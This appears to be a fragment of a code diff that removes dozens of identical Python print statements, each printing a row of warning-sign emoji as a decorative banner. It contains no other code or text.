-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
